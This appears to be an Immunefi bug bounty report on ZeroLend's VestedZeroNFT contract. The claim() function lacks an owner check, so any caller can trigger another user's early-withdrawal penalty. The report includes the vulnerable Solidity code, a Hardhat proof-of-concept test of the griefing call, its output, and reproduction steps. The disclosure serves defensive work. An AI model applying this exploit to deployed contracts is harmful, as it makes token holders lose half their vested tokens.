# 29139 - \[SC - Medium] Griefing attack to cause users to suffer penalt...

## Griefing attack to cause users to suffer penalty by calling the tokenId of another user that have VestedZeroNFT id with \_hasPenalty is true

Submitted on Mar 8th 2024 at 10:00:01 UTC by @perseverance for [Boost | ZeroLend](https://immunefi.com/bounty/zerolend-boost/)

Report ID: #29139

Report type: Smart Contract

Report severity: Medium

Target: <https://github.com/zerolend/governance>

Impacts:

* Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)

### Description

## Description

Griefing attack to cause users to suffer penalty by calling the tokenId of another user that have VestedZeroNFT id with \_hasPenalty is true

### Brief/Intro

VestedZeroNFT is a NFT based contract to hold all the user vests. NFTs can be traded on secondary marketplaces like Opensea, can be split into smaller chunks to allow for smaller otc deals to happen in secondary markets.

When mint a NFT tokenIT for a user, the function mint() can be used

<https://github.com/zerolend/governance/blob/main/contracts/vesting/VestedZeroNFT.sol#L63-L72>

```solidity
function mint(
        address _who,
        uint256 _pending,
        uint256 _upfront,
        uint256 _linearDuration,
        uint256 _cliffDuration,
        uint256 _unlockDate,
        bool _hasPenalty,
        VestCategory _category
    ) external returns (uint256) 

```

If the \_hasPenalty is true, then when users claim, the the zero token of the ownerOf(id) is deducted and amount is toClaim

<https://github.com/zerolend/governance/blob/main/contracts/vesting/VestedZeroNFT.sol#L170-L171>

```solidity
 uint256 _penalty = penalty(id);
toClaim += lock.pending - _penalty;

```

The \_penalty is <https://github.com/zerolend/governance/blob/main/contracts/vesting/VestedZeroNFT.sol#L207-L212>

```solidity
/// @inheritdoc IVestedZeroNFT
    function penalty(uint256 tokenId) public view returns (uint256) {
        LockDetails memory lock = tokenIdToLockDetails[tokenId];
        // (, uint256 _pending) = claimable(id);
        // TODO
        return (lock.pending * 5) / 10;
    }

```

<https://github.com/zerolend/governance/blob/main/contracts/vesting/VestedZeroNFT.sol#L159-L198>

```solidity
function claim(
        uint256 id
    ) public nonReentrant whenNotPaused returns (uint256 toClaim) {
        require(!frozen[id], "frozen");

        LockDetails memory lock = tokenIdToLockDetails[id];

        if (lock.hasPenalty) {
            // if the user hasn't claimed before, then calculate how much penalty should be charged
            // and send the remaining tokens to the user
            if (lock.pendingClaimed == 0) {
                uint256 _penalty = penalty(id);
                toClaim += lock.pending - _penalty;
                lock.pendingClaimed = lock.pending;

                // send the penalty tokens back to the staking bonus
                // contract (used for staking bonuses)
                zero.transfer(stakingBonus, _penalty);
            }
        } else {
            (uint256 _upfront, uint256 _pending) = claimable(id);

            // handle vesting without penalties
            // handle the upfront vesting
            if (_upfront > 0 && lock.upfrontClaimed == 0) {
                toClaim += _upfront;
                lock.upfrontClaimed = _upfront;
            }

            // handle the linear vesting
            if (_pending > 0 && lock.pendingClaimed >= 0) {
                toClaim += _pending - lock.pendingClaimed;
                lock.pendingClaimed += _pending - lock.pendingClaimed;
            }
        }

        tokenIdToLockDetails[id] = lock;

        if (toClaim > 0) zero.transfer(ownerOf(id), toClaim);
    }
```

So the design of the protocol is, if users need to claim after some time after minting (after the maturity date), then users can claim without the penalty.

But if the users claim before the maturity date, then user will suffer some penalty. The penalty amount of Zero token is sent to the StakingBonus and the rest is sent to the owner of the tokenId.

So the penalty is designed for early withdrawal as commented below.

This can be seen in the comment in line

<https://github.com/zerolend/governance/blob/main/contracts/voter/gauge/RewardBase.sol#L86-L98>

```
if (token == zero) {
            // if the token is ZERO; then vest it linearly for 3 months with a pentalty for
            // early withdrawals.
            vesting.mint(
                account, // address _who,
                _reward, // uint256 _pending,
                0, // uint256 _upfront,
                86400 * 30 * 3, // uint256 _linearDuration,
                0, // uint256 _cliffDuration,
                0, // uint256 _unlockDate,
                true, // bool _hasPenalty,
                IVestedZeroNFT.VestCategory.NORMAL // VestCategory _category
            );
        } else token.safeTransfer(account, _reward);
```

### Vulnerability Details

So the vulnerability here is the claim function does not check the caller msg.sender is owner of this tokenId. So a hacker can call the claim of the tokenId before maturity date thus make the user to loose his zero token and suffer the penalty. This is not desirable by the ownerof of the tokenId.

## Impacts

## About the severity assessment

So the bug allow griefing attack that don't bring benefit to the hacker that cause damage to users. So the Severity is Medium with Category: Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)

### Proof of Concept

Test case to demonstrate the bug

```typescript
it("Griefing attack to cause users to loose zero token", async function () {
    
    console.log("Mint a VestedZeroNFT for Ant by calling mint() function of VestedZeroNFT contract"); 
    let tokenId = await vest.mint(
      ant.address,
      e18 * 20n, // 20 ZERO linear vesting
      0, // 0 ZERO upfront
      1000, // linear duration - 1000 seconds
      0, // cliff duration - 0 seconds
      now + 1000, // unlock date
      true, // penalty -> true
      0
     );

    const [attacker] = await hre.ethers.getSigners();
    console.log("Zero balance of Ant", await zero.balanceOf(ant.address));
    console.log("Zero balance of vestZeroNFT contract", await zero.balanceOf(vest.target));
    let lastTokenId = await vest.lastTokenId();
    console.log("Ant address: ", ant.address);
    console.log("The hacker call the claim function of the vestZeroNFT contract to claim tokenID of Ant"); 
    console.log("The address of the owner of the TokenId: ", await vest.ownerOf(lastTokenId));
    console.log("Zero balance of StakingBonus before the attack", await zero.balanceOf(stakingBonus.target));
    await vest.connect(attacker).claim(lastTokenId); 
    console.log("Zero balance of Ant after griefing attack", await zero.balanceOf(ant.address));
    console.log("Zero balance of vestZeroNFT after attack", await zero.balanceOf(vest.target));
    console.log("Zero balance of StakingBonus before the attack", await zero.balanceOf(stakingBonus.target));
    console.log("The unclaimed amount of the tokenID", await vest.unclaimed(lastTokenId));

  });
```

Test Log: <https://drive.google.com/file/d/1oRfOksMKoIDuJzXbGlB-FcXaxta9lX9b/view?usp=sharing>

```
Mint a VestedZeroNFT for Ant by calling mint() function of VestedZeroNFT contract
Zero balance of Ant 0n
Zero balance of vestZeroNFT contract 20000000000000000000n
Ant address:  0x70997970C51812dc3A010C7d01b50e0d17dc79C8
The hacker call the claim function of the vestZeroNFT contract to claim tokenID of Ant
The address of the owner of the TokenId:  0x70997970C51812dc3A010C7d01b50e0d17dc79C8
Zero balance of StakingBonus before the attack 0n
Zero balance of Ant after griefing attack 10000000000000000000n
Zero balance of vestZeroNFT after attack 0n
Zero balance of StakingBonus before the attack 10000000000000000000n
The unclaimed amount of the tokenID 0n
    ✔ Griefing attack to cause users to loose zero token (106ms)
```

So when mint for the user Ant, 20 Zero is spent. So here the attacker call the claim function for the tokenId of Ant. Now after claim, Ant has received only 10 Zero and the unclaimed amount is 0. 10 Zero is sent to StakingBonus contract. So Ant lost 10 Zero token, means 50% as the penalty.

Test POC code:

Step 1: First clone the governance repository:

```
git clone https://github.com/zerolend/governance.git
```

Step2: Apply Git patch file

Bug3\_diff.patch link: <https://drive.google.com/file/d/1RDt9VaiWVZfa9e287mJHU7HxGZQ2QbzF/view?usp=sharing>

Apply the Patch by Git command using Git bash shell

```bash
git apply Bug3_diff.patch
```

Step 3: Input .env variables

cd to folder governance, To run the test, you need to

1. rename .env.example to .env
2. put the test Private\_key to the variable

```
   WALLET_PRIVATE_KEY= 
   NODE_ENV == "test" 
```

Step 4: Install and run test Run command

```
yarn install 
yarn test > test_all.log
```
